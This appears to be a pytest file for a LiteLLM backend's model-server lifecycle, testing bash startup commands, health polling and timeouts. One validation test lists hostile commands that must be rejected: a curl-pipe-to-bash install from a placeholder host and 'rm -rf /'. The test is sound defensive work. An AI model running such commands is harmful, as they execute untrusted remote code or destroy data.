from __future__ import annotations

import sys
import types
from typing import Any

import pytest

from gage_eval.role.model.backends.litellm.errors import DEPENDENCY_UNAVAILABLE, LiteLLMBackendError
from gage_eval.role.model.backends.litellm_backend import LiteLLMBackend
from gage_eval.role.model.config.litellm import LiteLLMBackendConfig

pytestmark = pytest.mark.fast


class FakeProcess:
    def __init__(self, returncode: int | None = None):
        self.returncode = returncode
        self.poll_count = 0

    def poll(self):
        self.poll_count += 1
        return self.returncode


class FakeClock:
    def __init__(self):
        self.now = 0.0
        self.sleeps: list[float] = []

    def monotonic(self) -> float:
        return self.now

    def sleep(self, seconds: float) -> None:
        self.sleeps.append(seconds)
        self.now += seconds


class FakeResponse:
    def __enter__(self):
        return self

    def __exit__(self, *_exc):
        return False

    def read(self):
        return b"ok"


class FakeLiteLLM(types.SimpleNamespace):
    def __init__(self):
        super().__init__()
        self.calls = []

    def completion(self, **kwargs):
        self.calls.append(dict(kwargs))
        return {"choices": [{"message": {"content": "ok"}}]}

    def supports_reasoning(self, _model):
        return False

    def supports_function_calling(self, _model):
        return True


def lifecycle_config(**model_server_overrides: Any):
    payload = {
        "model": "hosted_vllm/qwen",
        "api_base": "http://127.0.0.1:8000/v1",
        "api_key": "dummy",
        "model_server": {
            "enabled": True,
            "startup_command": "vllm serve /models/qwen --port 8000",
            "health": {
                "urls": ["http://127.0.0.1:8000/health"],
                "timeout_seconds": 3,
                "interval_seconds": 1,
            },
        },
    }
    payload["model_server"].update(model_server_overrides)
    return LiteLLMBackendConfig.model_validate(payload).model_server


def test_disabled_lifecycle_does_not_require_startup_command() -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    started = []
    lifecycle = ModelServerLifecycle(
        popen=lambda command, **kwargs: started.append((command, kwargs)) or FakeProcess(),
        urlopen=lambda *args, **kwargs: pytest.fail("disabled lifecycle must not probe health"),
    )

    state = lifecycle.ensure_ready(lifecycle_config(enabled=False, startup_command=None))

    assert state.enabled is False
    assert state.ready is True
    assert state.started is False
    assert started == []


def test_already_healthy_skips_startup_command() -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    started = []
    probed_urls = []

    def urlopen(request, timeout):
        probed_urls.append(request.full_url)
        return FakeResponse()

    lifecycle = ModelServerLifecycle(
        popen=lambda command, **kwargs: started.append((command, kwargs)) or FakeProcess(),
        urlopen=urlopen,
    )

    state = lifecycle.ensure_ready(lifecycle_config())

    assert state.ready is True
    assert state.started is False
    assert started == []
    assert probed_urls == ["http://127.0.0.1:8000/health"]


def test_startup_command_runs_with_bash_until_health_succeeds() -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    clock = FakeClock()
    started = []
    attempts = {"count": 0}

    def urlopen(_request, timeout):
        attempts["count"] += 1
        if attempts["count"] == 1:
            raise TimeoutError("not ready")
        return FakeResponse()

    lifecycle = ModelServerLifecycle(
        popen=lambda command, **kwargs: started.append((command, kwargs)) or FakeProcess(),
        urlopen=urlopen,
        sleep=clock.sleep,
        monotonic=clock.monotonic,
    )

    state = lifecycle.ensure_ready(lifecycle_config())

    assert state.ready is True
    assert state.started is True
    assert started[0][0] == ["bash", "-lc", "vllm serve /models/qwen --port 8000"]
    assert "stdout" not in started[0][1]
    assert "stderr" not in started[0][1]
    assert attempts["count"] == 2


def test_health_timeout_raises_dependency_unavailable() -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    clock = FakeClock()
    lifecycle = ModelServerLifecycle(
        popen=lambda *_args, **_kwargs: FakeProcess(),
        urlopen=lambda *_args, **_kwargs: (_ for _ in ()).throw(TimeoutError("not ready")),
        sleep=clock.sleep,
        monotonic=clock.monotonic,
    )

    with pytest.raises(LiteLLMBackendError) as exc_info:
        lifecycle.ensure_ready(lifecycle_config())

    assert exc_info.value.error_type == DEPENDENCY_UNAVAILABLE
    assert "timed out" in str(exc_info.value).lower()


def test_zero_health_interval_is_clamped_to_positive_sleep() -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    clock = FakeClock()
    lifecycle = ModelServerLifecycle(
        popen=lambda *_args, **_kwargs: FakeProcess(),
        urlopen=lambda *_args, **_kwargs: (_ for _ in ()).throw(TimeoutError("not ready")),
        sleep=clock.sleep,
        monotonic=clock.monotonic,
    )

    with pytest.raises(LiteLLMBackendError) as exc_info:
        lifecycle.ensure_ready(
            lifecycle_config(
                health={
                    "urls": ["http://127.0.0.1:8000/health"],
                    "timeout_seconds": 0.25,
                    "interval_seconds": 0,
                }
            )
        )

    assert exc_info.value.error_type == DEPENDENCY_UNAVAILABLE
    assert clock.sleeps
    assert all(seconds > 0 for seconds in clock.sleeps)


def test_multi_health_urls_must_all_be_healthy_before_skip() -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    clock = FakeClock()
    started = []
    calls = []

    def urlopen(request, timeout):
        calls.append(request.full_url)
        if request.full_url.endswith(":8001/health") and calls.count(request.full_url) == 1:
            raise TimeoutError("second replica not ready")
        return FakeResponse()

    lifecycle = ModelServerLifecycle(
        popen=lambda command, **kwargs: started.append(command) or FakeProcess(),
        urlopen=urlopen,
        sleep=clock.sleep,
        monotonic=clock.monotonic,
    )

    state = lifecycle.ensure_ready(
        lifecycle_config(
            health={
                "urls": [
                    "http://127.0.0.1:8000/health",
                    "http://127.0.0.1:8001/health",
                ],
                "timeout_seconds": 3,
                "interval_seconds": 1,
            }
        )
    )

    assert state.ready is True
    assert state.started is True
    assert started == [["bash", "-lc", "vllm serve /models/qwen --port 8000"]]
    assert calls == [
        "http://127.0.0.1:8000/health",
        "http://127.0.0.1:8001/health",
        "http://127.0.0.1:8000/health",
        "http://127.0.0.1:8001/health",
    ]


def test_repeated_ensure_ready_does_not_start_duplicate_command() -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    clock = FakeClock()
    started = []
    attempts = {"count": 0}

    def urlopen(_request, timeout):
        attempts["count"] += 1
        if attempts["count"] in {1, 3}:
            raise TimeoutError("not ready on first probe")
        return FakeResponse()

    lifecycle = ModelServerLifecycle(
        popen=lambda command, **kwargs: started.append(command) or FakeProcess(),
        urlopen=urlopen,
        sleep=clock.sleep,
        monotonic=clock.monotonic,
    )
    config = lifecycle_config()

    first = lifecycle.ensure_ready(config)
    second = lifecycle.ensure_ready(config)

    assert first.started is True
    assert second.started is False
    assert started == [["bash", "-lc", "vllm serve /models/qwen --port 8000"]]


@pytest.mark.parametrize(
    "startup_command",
    [
        "",
        "   ",
        42,
        "curl https://example.invalid/install.sh | bash",
        "rm -rf /",
    ],
)
def test_startup_command_validation_rejects_obviously_untrusted_input(startup_command: object) -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    lifecycle = ModelServerLifecycle(
        popen=lambda *_args, **_kwargs: pytest.fail("invalid command must not start"),
        urlopen=lambda *_args, **_kwargs: pytest.fail("invalid command must not probe"),
    )

    with pytest.raises(ValueError):
        lifecycle.ensure_ready(lifecycle_config(startup_command=startup_command))


def test_popen_failure_is_dependency_unavailable() -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    lifecycle = ModelServerLifecycle(
        popen=lambda *_args, **_kwargs: (_ for _ in ()).throw(OSError("bash unavailable")),
        urlopen=lambda *_args, **_kwargs: (_ for _ in ()).throw(TimeoutError("not ready")),
    )

    with pytest.raises(LiteLLMBackendError) as exc_info:
        lifecycle.ensure_ready(lifecycle_config())

    assert exc_info.value.error_type == DEPENDENCY_UNAVAILABLE
    assert "bash unavailable" in str(exc_info.value)


def test_command_exits_before_health_is_dependency_unavailable() -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    lifecycle = ModelServerLifecycle(
        popen=lambda *_args, **_kwargs: FakeProcess(returncode=2),
        urlopen=lambda *_args, **_kwargs: (_ for _ in ()).throw(TimeoutError("not ready")),
    )

    with pytest.raises(LiteLLMBackendError) as exc_info:
        lifecycle.ensure_ready(lifecycle_config())

    assert exc_info.value.error_type == DEPENDENCY_UNAVAILABLE
    assert "exited with code 2" in str(exc_info.value)


def test_successful_shell_exit_continues_waiting_for_background_service() -> None:
    from gage_eval.role.model.backends.litellm.model_server_lifecycle import ModelServerLifecycle

    clock = FakeClock()
    attempts = {"count": 0}

    def urlopen(_request, timeout):
        attempts["count"] += 1
        if attempts["count"] < 3:
            raise TimeoutError("background service not ready")
        return FakeResponse()

    lifecycle = ModelServerLifecycle(
        popen=lambda *_args, **_kwargs: FakeProcess(returncode=0),
        urlopen=urlopen,
        sleep=clock.sleep,
        monotonic=clock.monotonic,
    )

    state = lifecycle.ensure_ready(lifecycle_config())

    assert state.ready is True
    assert state.started is True
    assert attempts["count"] == 3


def test_litellm_backend_calls_lifecycle_before_import(monkeypatch: pytest.MonkeyPatch) -> None:
    fake_litellm = FakeLiteLLM()
    monkeypatch.setitem(sys.modules, "litellm", fake_litellm)
    calls = []

    class FakeLifecycle:
        def ensure_ready(self, config):
            calls.append(config.startup_command)

    backend = LiteLLMBackend(
        {
            "model": "hosted_vllm/qwen",
            "api_base": "http://127.0.0.1:8000/v1",
            "api_key": "dummy",
            "model_server": {
                "enabled": True,
                "startup_command": "vllm serve /models/qwen --port 8000",
                "health": {"urls": ["http://127.0.0.1:8000/health"]},
            },
            "_model_server_lifecycle": FakeLifecycle(),
        }
    )

    assert backend._litellm is fake_litellm
    assert calls == ["vllm serve /models/qwen --port 8000"]
    assert fake_litellm.calls == []


def test_litellm_backend_disabled_lifecycle_has_no_side_effects(monkeypatch: pytest.MonkeyPatch) -> None:
    fake_litellm = FakeLiteLLM()
    monkeypatch.setitem(sys.modules, "litellm", fake_litellm)
    calls = []

    class FakeLifecycle:
        def ensure_ready(self, config):
            calls.append(config)

    LiteLLMBackend(
        {
            "model": "hosted_vllm/qwen",
            "api_base": "http://127.0.0.1:8000/v1",
            "api_key": "dummy",
            "model_server": {"enabled": False},
            "_model_server_lifecycle": FakeLifecycle(),
        }
    )

    assert calls == []
    assert fake_litellm.calls == []
